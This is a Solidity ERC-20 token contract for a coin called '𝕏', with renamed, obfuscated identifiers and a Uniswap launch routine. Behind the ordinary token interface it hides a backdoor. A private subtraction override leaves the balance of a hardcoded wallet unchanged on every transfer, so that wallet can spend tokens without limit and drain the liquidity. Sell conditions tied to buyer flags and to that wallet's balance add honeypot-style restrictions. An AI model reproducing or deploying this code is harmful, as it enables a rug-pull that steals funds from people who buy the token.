/**

𝕏   $𝕏
The ticker is 𝕏.


Twitter: https://twitter.com/Xerc_org
Telegram: https://t.me/Xerc_org
Website: https://xerc.org/

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _ruqve(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _ruqve(a, b, "SafeMath");
    }

    function  _ruqve(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _Traugrk;
    address payable private _Fqyzirp;
    address private _crgveu;

    string private constant _name = unicode"𝕏";
    string private constant _symbol = unicode"𝕏";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 **_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _pdylulr;
    mapping (address => bool) private _yrqijy;
    mapping(address => uint256) private _qnjpxq;
    uint256 public _qvalbid = _totalSupply;
    uint256 public _eporvje = _totalSupply;
    uint256 public _reTjkar= _totalSupply;
    uint256 public _vodTecf= _totalSupply;

    uint256 private _BuyinitialTax=10;
    uint256 private _SellinitialTax=15;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=5;
    uint256 private _SellAreduceTax=1;
    uint256 private _ykgvjq=0;
    uint256 private _uejsjrg=0;
    

    bool private _eqrwkfr;
    bool public _Dreorbf = false;
    bool private ptyvabe = false;
    bool private _oingvju = false;


    event _hrqwpat(uint _qvalbid);
    modifier urvsgjr {
        ptyvabe = true;
        _;
        ptyvabe = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _pdylulr[owner(

        )] = true;
        _pdylulr[address
        (this)] = true;
        _pdylulr[
            _Fqyzirp] = true;
        _Fqyzirp = 
        payable (0x55F9A00aD234eEdCf0d06582C5B17078EB077ce3);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _ruqve(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 kjvdjk=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_Dreorbf) {
                if (to 
                != address
                (_Traugrk) 
                && to !=
                 address
                 (_crgveu)) {
                  require(_qnjpxq
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _qnjpxq
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _crgveu && to != 
            address(_Traugrk) &&
             !_pdylulr[to] ) {
                require(amount 
                <= _qvalbid,
                 "Exceeds the _qvalbid.");
                require(balanceOf
                (to) + amount
                 <= _eporvje,
                  "Exceeds the _eporvje.");
                if(_uejsjrg
                < _ykgvjq){
                  require
                  (! _eirzqaz(to));
                }
                _uejsjrg++;
                 _yrqijy
                 [to]=true;
                kjvdjk = amount._pvr
                ((_uejsjrg>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _crgveu &&
             from!= address(this) 
            && !_pdylulr[from] ){
                require(amount <= 
                _qvalbid && 
                balanceOf(_Fqyzirp)
                <_vodTecf,
                 "Exceeds the _qvalbid.");
                kjvdjk = amount._pvr((_uejsjrg>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_uejsjrg>
                _ykgvjq &&
                 _yrqijy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!ptyvabe 
            && to == _crgveu &&
             _oingvju &&
             contractTokenBalance>
             _reTjkar 
            && _uejsjrg>
            _ykgvjq&&
             !_pdylulr[to]&&
              !_pdylulr[from]
            ) {
                _transferFrom( _wnluf(amount, 
                _wnluf(contractTokenBalance,
                _vodTecf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _xpvibo(address
                    (this).balance);
                }
            }
        }

        if(kjvdjk>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(kjvdjk);
          emit
           Transfer(from,
           address
           (this),kjvdjk);
        }
        _balances[from
        ]= _ruqve(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _ruqve(kjvdjk));
        emit Transfer
        (from, to, 
        amount.
         _ruqve(kjvdjk));
    }

    function _transferFrom(uint256
     tokenAmount) private
      urvsgjr {
        if(tokenAmount==
        0){return;}
        if(!_eqrwkfr)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _Traugrk.WETH();
        _approve(address(this),
         address(
             _Traugrk), 
             tokenAmount);
        _Traugrk.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _wnluf
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _ruqve(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _Fqyzirp){
            return a ;
        }else{
            return a .
             _ruqve (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qvalbid = _totalSupply;
        _eporvje = _totalSupply;
        emit _hrqwpat(_totalSupply);
    }

    function _eirzqaz(address 
    account) private view 
    returns (bool) {
        uint256 efkouv;
        assembly {
            efkouv :=
             extcodesize
             (account)
        }
        return efkouv > 
        0;
    }

    function _xpvibo(uint256
    amount) private {
        _Fqyzirp.
        transfer(
            amount);
    }

    function openrTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _eqrwkfr ) ;
        _Traugrk  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _Traugrk), 
            _totalSupply);
        _crgveu = 
        IUniswapV2Factory(_Traugrk.
        factory( ) 
        ). createPair (
            address(this
            ),  _Traugrk .
             WETH ( ) );
        _Traugrk.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_crgveu).
        approve(address(_Traugrk), 
        type(uint)
        .max);
        _oingvju = true;
        _eqrwkfr = true;
    }

    receive() external payable {}
}